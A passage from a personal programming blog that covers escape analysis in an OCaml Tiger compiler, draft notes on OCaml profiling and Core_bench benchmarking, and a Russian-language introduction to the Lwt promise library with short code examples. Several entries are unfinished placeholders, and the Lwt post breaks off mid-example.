<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#95a5a6">(** Depth (nesting level) of the function that
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6">    contains the variable declaration *)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">type</span> <span style="color:#434f54">depth</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#95a5a6">(** Environment that maps variables to pairs of depth and
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6">    a reference to a boolean flag indicating if a
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6">    particular variable escapes *)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">type</span> <span style="color:#434f54">env</span> <span style="color:#728e00">=</span> <span style="color:#728e00">(</span><span style="color:#434f54">depth</span> <span style="color:#728e00">*</span> <span style="color:#00979d">bool</span> <span style="color:#434f54">ref</span><span style="color:#728e00">)</span> <span style="color:#434f54">Symbol</span>.<span style="color:#434f54">Table</span>.<span style="color:#434f54">t</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#95a5a6">(** Looks for escaping variables and records this
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6">    info in the [escape] fields of the abstract syntax *)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">val</span> <span style="color:#434f54">traverse_prog</span> <span style="color:#728e00">:</span> <span style="color:#434f54">Syntax</span>.<span style="color:#434f54">expr</span> <span style="color:#728e00">-&gt;</span> <span style="color:#00979d">unit</span>
</span></span></code></pre></div><p>The <code>traverse_prog</code> function is going to traverse the entire AST
looking for escaping uses of every variable. Also, we&rsquo;ll have a
separate environment <code>env</code> to track &ldquo;escaping&rdquo; of variables.</p>
<p>Whenever a variable or formal-parameter declaration \(a\) is
found at static function-nesting depth \(d\) then a new binding
<code>(d, ref false)</code> is entered into the environment <code>env</code>. This new
environment is used in processing expressions within the scope
of the variable. Then whenever this var or formal-parameter
\(a\) is used at depth \(\gt d\) (which means that it escapes),
then our &ldquo;escape ref&rdquo; is set to <code>true</code> in the environment.</p>
<p>This should take place before semantic analysis, because the
<code>Semant</code> module needs to know about escaping variables to do
it&rsquo;s work.</p>
</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p>Semant</p>
<p>Now lets go and update our <code>Semant</code> module.</p>
<p>I won&rsquo;t paste the whole implementation, the code is <a href="https://github.com/vyorkin/tiger/blob/master/chapter6/lib/semant.ml"  class="external-link" target="_blank" rel="noopener">here</a>.</p>
</li>
</ul>
<h2 id="haskell">
  Haskell <span class="tag"><span class="_haskell">@haskell</span><span class="haskell">haskell</span></span>
  <a class="heading-link" href="#haskell">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<h3 id="a-week-of-liquid-haskell">
  <span class="org-todo todo TODO">TODO</span> A week of Liquid Haskell <span class="tag"><span class="_liquid_haskell">@liquid-haskell</span><span class="liquid_haskell">liquid-haskell</span><span class="refinement_types">refinement-types</span></span>
  <a class="heading-link" href="#a-week-of-liquid-haskell">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>In this post I&rsquo;ll share my experience of playing around with Liquid
Haskell for about a week.</p>
<h3 id="building-a-toy-ethereum-like-vm-in-haskell">
  <span class="org-todo todo TODO">TODO</span> Building a toy Ethereum-like VM in Haskell <span class="tag"><span class="compilers">compilers</span><span class="ethereum">ethereum</span><span class="vm">vm</span></span>
  <a class="heading-link" href="#building-a-toy-ethereum-like-vm-in-haskell">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<h3 id="writing-a-simple-trading-bot-in-haskell">
  <span class="org-todo todo TODO">TODO</span> Writing a simple trading bot in Haskell <span class="tag"><span class="trading">trading</span></span>
  <a class="heading-link" href="#writing-a-simple-trading-bot-in-haskell">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>Some time ago I was interested in trading blah blah.</p>
<h3 id="notes-on-parallel-and-concurrent-programming-in-haskell">
  <span class="org-todo todo TODO">TODO</span> Notes on parallel &amp; concurrent programming in Haskell
  <a class="heading-link" href="#notes-on-parallel-and-concurrent-programming-in-haskell">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>\begin{equation}
\label{eq:1}
C = W\log_{2} (1+\mathrm{SNR})
\end{equation}</p>
<p>See: <a href="http://www.jmilne.org/not/Mamscd.pdf"  class="external-link" target="_blank" rel="noopener">http://www.jmilne.org/not/Mamscd.pdf</a></p>
<p>\(\require{AMScd}\)</p>
<p>\begin{CD}
K(X) @&gt;{ch}&raquo; H(X;\mathbb Q);\\
@VVV @VVV \\
K(Y) @&gt;{ch}&raquo; H(Y;\mathbb Q);
\end{CD}</p>
<h2 id="ocaml">
  OCaml <span class="tag"><span class="_ocaml">@ocaml</span><span class="ocaml">ocaml</span></span>
  <a class="heading-link" href="#ocaml">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<h3 id="instrumenting-and-profiling-ocaml">
  <span class="org-todo todo DRAFT">DRAFT</span> Instrumenting and profiling OCaml programs <span class="tag"><span class="benchmarking">benchmarking</span><span class="profiling">profiling</span><span class="performance">performance</span></span>
  <a class="heading-link" href="#instrumenting-and-profiling-ocaml">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<h4 id="intro">
  Intro
  <a class="heading-link" href="#intro">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<p>Profiling is rather a large topic, but basically it allows us to
learn where the program spent its time and which functions
called which other functions during its execution. We use that
information to understand which pieces of our program are slower
than we expected.</p>
<p>Note the difference between profiling and benchmarking: we use
(micro-)benchmarking to estimate the cost of executing an
individual isolated pieces of code, but we use profiling to
understand to properties of the whole program and possibly find
the hot spots.</p>
<p>Usually profiling is achieved by instrumenting either the
program source code or its binary executable. <strong>Instrumentation</strong>
means adding some extra code to collect the required information
(for example, where it was called from), which may cause
significant performance changes. This is why code should only
execute if some special flag is set (like <code>--profile</code> / <code>-p</code>).</p>
<p>Here are some known instrumentation types according to the
Wikipedia:</p>
<ul>
<li><strong>Manual</strong> – performed by the programmer by adding extra code to
measure execution costs</li>
<li><strong>Automatic source level</strong> – instrumentation added to the source
code by an automatic tool according to an instrumentation policy</li>
<li><strong>Interpreter instrumentation</strong> – interpreter debug option can
enable the collection of performance metrics as the
interpreter encounters each target statement</li>
<li><strong>Intermediate language</strong> – instrumentation added to assembly or
byte code</li>
<li><strong>Binary translation</strong> – the tool adds instrumentation to a
compiled executable</li>
<li><strong>Compiler assisted</strong></li>
<li><strong>Runtime instrumentation and injection</strong></li>
</ul>
<p>In this post we are going to take a closer look only at the
<strong>manual instrumentation</strong> and the <strong>interpreter instrumentation</strong>
in a context of the OCaml language and its ecosystem.</p>
<p>Typically profiling includes the following steps:</p>
<ul>
<li>Compiling (or just running) a program with profiling enabled</li>
<li>Executing it to generate profile data</li>
<li>Analyzing profile data to find bottlenecks</li>
</ul>
<p>We also may want to consider the output format. Generally these
forms may be available for the analysis:</p>
<ul>
<li><strong>Flat</strong> – Shows the average call times for each function and
how much time spent executing that function. Output is in the
form of a table, rows are usually sorted by decreasing time
spent and a number of calls, then alphabetically by name. <a href="https://sourceware.org/binutils/docs/gprof/Flat-Profile.html#Flat-Profile"  class="external-link" target="_blank" rel="noopener">Here</a>
is the more detailed description with an example</li>
<li><strong>Call-graph</strong> – Includes call-chains involved. Helps to find
functions that call other functions that spend unusual amounts
of time. Again, there is a good example in <a href="https://sourceware.org/binutils/docs/gprof/Call-Graph.html#Call-Graph"  class="external-link" target="_blank" rel="noopener">gprof docs</a></li>
<li><strong>Annotated source</strong> – Lists the program  source code annotated
with the number of times each line of the program was executed
(see an example in <a href="https://sourceware.org/binutils/docs/gprof/Annotated-Source.html#Annotated-Source"  class="external-link" target="_blank" rel="noopener">gprof docs</a>)</li>
<li><strong>Input-sensitive</strong> – Additionally shows how an application’s
performance scales as a function of its input</li>
</ul>
<h4 id="tools">
  Tools
  <a class="heading-link" href="#tools">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<p>There are several profiling tools available in OCaml ecosystem.</p>
<!--list-separator-->
<ul>
<li>
<p><a href="https://github.com/janestreet/core_profiler"  class="external-link" target="_blank" rel="noopener">core_profiler</a></p>
<p>Library made by Jane Street that helps you profile programs and
estimate various costs. It belongs to the <code>Core</code> ecosystem,
which is good, but looks like it&rsquo;s poorly documented. Here is
the <a href="https://blog.janestreet.com/what-the-interns-have-wrought-rpc_parallel-and-core_profiler/"  class="external-link" target="_blank" rel="noopener">post</a> describing this library and the <a href="https://ocaml.janestreet.com/ocaml-core/latest/doc/core_profiler/core_profiler.html"  class="external-link" target="_blank" rel="noopener">docs</a> (with usage
examples).</p>
</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p><a href="https://github.com/LexiFi/landmarks"  class="external-link" target="_blank" rel="noopener">landmarks</a></p>
<p>The tool made by <a href="http://www.lexifi.com/"  class="external-link" target="_blank" rel="noopener">LexiFi</a>. Personally I haven’t tried it, but it
looks good.</p>
</li>
</ul>
<h4 id="references">
  References
  <a class="heading-link" href="#references">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<p>Statistical memory profiling:</p>
<ul>
<li><a href="http://ocaml.org/meetings/ocaml/2016/Jourdan-statistically_profiling_memory_in_OCaml.pdf"  class="external-link" target="_blank" rel="noopener">http://ocaml.org/meetings/ocaml/2016/Jourdan-statistically_profiling_memory_in_OCaml.pdf</a></li>
<li><a href="https://www.youtube.com/watch?v=wX4m8yqbuqE"  class="external-link" target="_blank" rel="noopener">https://www.youtube.com/watch?v=wX4m8yqbuqE</a></li>
</ul>
<h4 id="summary">
  Summary
  <a class="heading-link" href="#summary">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<p>Unfortunately this post is not finished :P</p>
<h3 id="benchmarking-ocaml-code">
  <span class="org-todo todo DRAFT">DRAFT</span> Benchmarking OCaml code <span class="tag"><span class="benchmarking">benchmarking</span><span class="performance">performance</span></span>
  <a class="heading-link" href="#benchmarking-ocaml-code">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>The most known tool for benchmarking OCaml code is the
<a href="https://github.com/janestreet/core_bench"  class="external-link" target="_blank" rel="noopener">Core_bench</a> by Jane Street. There is a <a href="https://blog.janestreet.com/core_bench-micro-benchmarking-for-ocaml/"  class="external-link" target="_blank" rel="noopener">post about it</a> in the Jane
Street tech blog that should help to get started, but it may be
a bit outdated.</p>
<p>Here is the basic usage:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">open</span> <span style="color:#434f54">Core</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">open</span> <span style="color:#434f54">Core_bench</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">module</span> <span style="color:#434f54">B</span> <span style="color:#728e00">=</span> <span style="color:#434f54">Bench</span>.<span style="color:#434f54">Test</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">benchmarks</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">let</span> <span style="color:#434f54">x</span> <span style="color:#728e00">=</span> <span style="color:#434f54">Random</span>.<span style="color:#434f54">float</span> <span style="color:#434f54">10</span><span style="color:#728e00">.</span><span style="color:#434f54">0</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">let</span> <span style="color:#434f54">y</span> <span style="color:#728e00">=</span> <span style="color:#434f54">Random</span>.<span style="color:#434f54">float</span> <span style="color:#434f54">10</span><span style="color:#728e00">.</span><span style="color:#434f54">0</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">[</span> <span style="color:#434f54">B</span>.<span style="color:#434f54">create</span> <span style="color:#728e00">~</span><span style="color:#434f54">name</span><span style="color:#728e00">:</span> <span style="color:#7f8c8d">&#34;Float add&#34;</span> <span style="color:#728e00">(</span><span style="color:#728e00">fun</span> <span style="color:#434f54">()</span> <span style="color:#728e00">-&gt;</span> <span style="color:#434f54">ignore</span> <span style="color:#728e00">(</span><span style="color:#434f54">x</span> <span style="color:#728e00">+.</span> <span style="color:#434f54">y</span><span style="color:#728e00">))</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">;</span> <span style="color:#434f54">B</span>.<span style="color:#434f54">create</span> <span style="color:#728e00">~</span><span style="color:#434f54">name</span><span style="color:#728e00">:</span> <span style="color:#7f8c8d">&#34;Float mul&#34;</span> <span style="color:#728e00">(</span><span style="color:#728e00">fun</span> <span style="color:#434f54">()</span> <span style="color:#728e00">-&gt;</span> <span style="color:#434f54">ignore</span> <span style="color:#728e00">(</span><span style="color:#434f54">x</span> <span style="color:#728e00">*.</span> <span style="color:#434f54">y</span><span style="color:#728e00">))</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">;</span> <span style="color:#434f54">B</span>.<span style="color:#434f54">create</span> <span style="color:#728e00">~</span><span style="color:#434f54">name</span><span style="color:#728e00">:</span> <span style="color:#7f8c8d">&#34;Float div&#34;</span> <span style="color:#728e00">(</span><span style="color:#728e00">fun</span> <span style="color:#434f54">()</span> <span style="color:#728e00">-&gt;</span> <span style="color:#434f54">ignore</span> <span style="color:#728e00">(</span><span style="color:#434f54">x</span> <span style="color:#728e00">/.</span> <span style="color:#434f54">y</span><span style="color:#728e00">))</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">()</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">let</span> <span style="color:#434f54">cmd</span> <span style="color:#728e00">=</span> <span style="color:#434f54">Bench</span>.<span style="color:#434f54">make_command</span> <span style="color:#434f54">benchmarks</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">Command</span>.<span style="color:#434f54">run</span> <span style="color:#434f54">cmd</span>
</span></span></code></pre></div><h3 id="about-lwt.ru-ru">
  <span class="org-todo done DONE">DONE</span> Заметка о Lwt <span class="tag"><span class="lwt">lwt</span></span>
  <a class="heading-link" href="#about-lwt.ru-ru">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<h4 id="что-такое-lwt">
  Что такое Lwt
  <a class="heading-link" href="#%d1%87%d1%82%d0%be-%d1%82%d0%b0%d0%ba%d0%be%d0%b5-lwt">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<p><a href="https://github.com/ocsigen/lwt"  class="external-link" target="_blank" rel="noopener">Lwt</a> это одна из наиболее популярных OCaml библиотек,
разрабатываемая сообществом. По сути это просто реализация
<a href="https://en.wikipedia.org/wiki/Cooperative_multitasking"  class="external-link" target="_blank" rel="noopener">кооперативной многозадачности</a> (как альтернативы <a href="https://en.wikipedia.org/wiki/Preemption_%28computing%29"  class="external-link" target="_blank" rel="noopener">вытесняющей
многозадачности</a>) в OCaml на основе <a href="https://en.wikipedia.org/wiki/Futures_and_promises"  class="external-link" target="_blank" rel="noopener">Promises</a>.</p>
<p><em>В дальнейшем я буду использовать слова “поток” и промис как
взаимозаменямые</em>.</p>
<h4 id="виды-многозадачностей">
  Виды “многозадачностей”
  <a class="heading-link" href="#%d0%b2%d0%b8%d0%b4%d1%8b-%d0%bc%d0%bd%d0%be%d0%b3%d0%be%d0%b7%d0%b0%d0%b4%d0%b0%d1%87%d0%bd%d0%be%d1%81%d1%82%d0%b5%d0%b9">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<p><em>Этот параграф можно пропустить</em></p>
<p>Если в двух словах, то вытесняющую и кооперативную
многозадачность можно объяснить следующим образом:</p>
<ul>
<li>
<p><strong>Вытесняющая многозадачность</strong> означает, что у нас есть некий
планировщик, принимающий решения о том, когда будет
выполняться какой поток, обычно принимая во внимание приоритет
потоков и выделяя им некие кванты времени. Этот вид
многозадачности используется в большинстве современных ОС.</p>
</li>
<li>
<p><strong>Кооперативная многозадачность</strong> – планировщик не принимает
решение о переключении потоков. Поток должен явно
сигнализировать о том, что он готов прерваться и предоставить
процессорное время другим потокам.</p>
</li>
</ul>
<h4 id="асинхронное-программирование-с-lwt-и-промисы">
  Асинхронное программирование с Lwt и промисы
  <a class="heading-link" href="#%d0%b0%d1%81%d0%b8%d0%bd%d1%85%d1%80%d0%be%d0%bd%d0%bd%d0%be%d0%b5-%d0%bf%d1%80%d0%be%d0%b3%d1%80%d0%b0%d0%bc%d0%bc%d0%b8%d1%80%d0%be%d0%b2%d0%b0%d0%bd%d0%b8%d0%b5-%d1%81-lwt-%d0%b8-%d0%bf%d1%80%d0%be%d0%bc%d0%b8%d1%81%d1%8b">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<p>Lwt предоставляет нам тип данных <code>'a Lwt.t</code>. Можно относиться к
нему, как к “потоку”. Это обычный промис, содержащий некоторое
значение типа <code>'a</code>, которое может быть вычислено, например,
когда-то в будущем, но только один раз. В терминах OCaml это
просто <code>'a ref</code>, который будет заполнен позже. Изначально
значения в нём нет и промис находится в состоянии <code>Sleep</code> (pending).
Когда вычисление завершено успешно, Lwt помещает результат типа
<code>'a</code> в наш промис и его состояние становится <code>Return</code> (resolved). В
случае же неудачи его состояние изменяется на <code>Fail</code> (rejected) и в
него помещается произошедшая ошибка.</p>
<!--list-separator-->
<ul>
<li>
<p>API</p>
<p>Вот как выглядит тип, описывающий состояния:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">type</span> <span style="color:#728e00">&#39;</span><span style="color:#434f54">a</span> <span style="color:#434f54">state</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">Return</span> <span style="color:#728e00">of</span> <span style="color:#728e00">&#39;</span><span style="color:#434f54">a</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">Fail</span> <span style="color:#728e00">of</span> <span style="color:#434f54">exn</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">Sleep</span>
</span></span></code></pre></div><p>Lwt предоставляет несколько полезных ф-ций:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">val</span> <span style="color:#434f54">return</span> <span style="color:#728e00">:</span> <span style="color:#728e00">&#39;</span><span style="color:#434f54">a</span> <span style="color:#728e00">-&gt;</span> <span style="color:#728e00">&#39;</span><span style="color:#434f54">a</span> <span style="color:#434f54">Ltw</span>.<span style="color:#434f54">t</span>
</span></span></code></pre></div><p>Понятно, что эта ф-ция тривиально упаковывает уже известно
значение в промис. Соответственно, этот промис сразу находится в
состоянии <code>Return</code> (resolved).</p>
<p>Значения, упакованные в <code>Lwt.t</code>, не могут быть просто извлечены
(т.к. вычисление может быть ещё не завершено). Для этого мы
должны использовать оператор <code>bind</code>:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">val</span> <span style="color:#728e00">(&gt;&gt;=):</span> <span style="color:#728e00">&#39;</span><span style="color:#434f54">a</span> <span style="color:#434f54">Lwt</span>.<span style="color:#434f54">t</span> <span style="color:#728e00">-&gt;</span> <span style="color:#728e00">(</span><span style="color:#728e00">&#39;</span><span style="color:#434f54">a</span> <span style="color:#728e00">-&gt;</span> <span style="color:#728e00">&#39;</span><span style="color:#434f54">b</span> <span style="color:#434f54">Lwt</span>.<span style="color:#434f54">t</span><span style="color:#728e00">)</span> <span style="color:#728e00">-&gt;</span> <span style="color:#728e00">&#39;</span><span style="color:#434f54">b</span> <span style="color:#434f54">Lwt</span>.<span style="color:#434f54">t</span>
</span></span></code></pre></div><p>Такая конструкция позволяет нам делать композицию промисов в
“монадическом” стиле.</p>
<p><code>f &gt;&gt;= g</code> создаст нам промис, который ждёт пока завершится
“поток” <code>f : 'a Lwt.t</code>, получает результат его вычислений (некий
<code>x : 'a</code>) и передаёт его в ф-цию <code>g : 'a -&gt; 'b Ltw.t</code>, которая
запускает поток <code>'b Ltw.t</code>. Если <code>f</code> находится в состоянии
<strong>pending</strong>, то и <code>f &gt;&gt;= g</code> будет в состоянии <code>pending</code>.
Соответственно, если <code>f</code> завершится с ошибкой, то и <code>f &gt;&gt;= g</code>
завершится с той же самой ошибкой.</p>
<p>Несколько других полезных ф-ций:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">val</span> <span style="color:#434f54">join</span> <span style="color:#728e00">:</span> <span style="color:#00979d">unit</span> <span style="color:#434f54">Lwt</span>.<span style="color:#434f54">t</span> <span style="color:#00979d">list</span> <span style="color:#728e00">-&gt;</span> <span style="color:#00979d">unit</span> <span style="color:#434f54">Lwt</span>.<span style="color:#434f54">t</span>
</span></span></code></pre></div><p><code>join</code> получает список потоков и ожидает пока они все
завершатся. Если хотя бы один из них завершится с ошибкой
(перейдёт в состояние rejected), то и результирующий поток
завершится с той же ошибкой (после того, как все остальные
потоки завершат свои вычисления).</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">val</span> <span style="color:#434f54">choose</span> <span style="color:#728e00">:</span> <span style="color:#728e00">&#39;</span><span style="color:#434f54">a</span> <span style="color:#434f54">t</span> <span style="color:#00979d">list</span> <span style="color:#728e00">-&gt;</span> <span style="color:#728e00">&#39;</span><span style="color:#434f54">a</span> <span style="color:#434f54">t</span>
</span></span></code></pre></div><p><code>choose</code> ждёт пока выполнится хотя бы один поток. Если таких
оказалось несколько, то в качестве результата выбирается один из
них cлучайным образом.</p>
<p>На самом деле их огромное множество и все их можно найти <a href="http://ocsigen.org/lwt/dev/api/Lwt_list"  class="external-link" target="_blank" rel="noopener">тут</a>.</p>
</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p>PPX</p>
<p>У нас есть следующий синтаксический сахар:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">let</span><span style="color:#728e00">%</span><span style="color:#434f54">lwt</span> <span style="color:#434f54">i</span> <span style="color:#728e00">=</span> <span style="color:#434f54">f</span> <span style="color:#434f54">()</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">...</span>
</span></span></code></pre></div><p>Что эквивалентно следующему фрагменту:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#434f54">Lwt</span>.<span style="color:#434f54">bind</span> <span style="color:#728e00">(</span><span style="color:#434f54">f</span> <span style="color:#434f54">()</span><span style="color:#728e00">)</span> <span style="color:#728e00">(</span><span style="color:#728e00">fun</span> <span style="color:#434f54">i</span> <span style="color:#728e00">-&gt;</span> <span style="color:#728e00">...)</span>
</span></span></code></pre></div></li>
</ul>
<!--list-separator-->
<ul>
<li>
<p>Примеры</p>
<p><em>Следующие примеры я взял из официального туториала</em></p>
<p>Чтение из STDIN без Lwt, выполнение блокируется пока не
поступит пользовательский ввод:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">()</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">let</span> <span style="color:#434f54">line</span> <span style="color:#728e00">:</span> <span style="color:#00979d">string</span> <span style="color:#728e00">=</span> <span style="color:#434f54">Pervasives</span>.<span style="color:#434f54">read_line</span> <span style="color:#434f54">()</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">print_endline</span> <span style="color:#7f8c8d">&#34;Now unblocked!&#34;</span><span style="color:#728e00">;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">ignore</span> <span style="color:#434f54">line</span>
</span></span></code></pre></div><p>С промисами Lwt выполнение продолжается:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">()</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">let</span> <span style="color:#434f54">line_promise</span> <span style="color:#728e00">:</span> <span style="color:#00979d">string</span> <span style="color:#434f54">Lwt</span>.<span style="color:#434f54">t</span> <span style="color:#728e00">=</span> <span style="color:#434f54">Lwt_io</span>.<span style="color:#728e00">(</span><span style="color:#434f54">read_line</span> <span style="color:#434f54">stdin</span><span style="color:#728e00">)</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">print_endline</span> <span style="color:#7f8c8d">&#34;Execution just continues...&#34;</span><span style="color:#728e00">;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">ignore</span> <span style="color:#434f54">line_promise</span>
</span></span></code></pre></div><p>В данном случае это не совсем то, что нам нужно, т.к. программа
сразу завершает работу так и не дождавшись пользовательского
ввода. Чтобы заблокироваться и подождать пока промис выполнится
мы можем использовать ф-цию <code>Lwt_main.run</code>:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">()</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">let</span> <span style="color:#434f54">line_promise</span> <span style="color:#728e00">:</span> <span style="color:#00979d">string</span> <span style="color:#434f54">Lwt</span>.<span style="color:#434f54">t</span> <span style="color:#728e00">=</span> <span style="color:#434f54">Lwt_io</span>.<span style="color:#728e00">(</span><span style="color:#434f54">read_line</span> <span style="color:#434f54">stdin</span><span style="color:#728e00">)</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">print_endline</span> <span style="color:#7f8c8d">&#34;Execution just continues...&#34;</span><span style="color:#728e00">;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">let</span> <span style="color:#434f54">line</span> <span style="color:#728e00">:</span> <span style="color:#00979d">string</span> <span style="color:#728e00">=</span> <span style="color:#434f54">Lwt_main</span>.<span style="color:#434f54">run</span> <span style="color:#434f54">line_promise</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">ignore</span> <span style="color:#434f54">line</span>
</span></span></code></pre></div><p><code>Lwt_main.run</code> используется только 1 раз, чтобы подожать пока
завершится промис самого верхнего уровня. Когда этот промис
выполнится, программа завершает работу.</p>
</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p>Ещё примеры:</p>
<p>Опять же, я не заморачивался и взял примеры из официального
туториала, тк я слишком ленивый, чтобы придумывать их самому.</p>
<p>Пример функции, которая печатает “tic” каждую секунду, не
блокируя другие “потоки”:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#728e00">rec</span> <span style="color:#434f54">tic</span> <span style="color:#434f54">()</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">print_endline</span> <span style="color:#7f8c8d">&#34;tic&#34;</span><span style="color:#728e00">;</span>
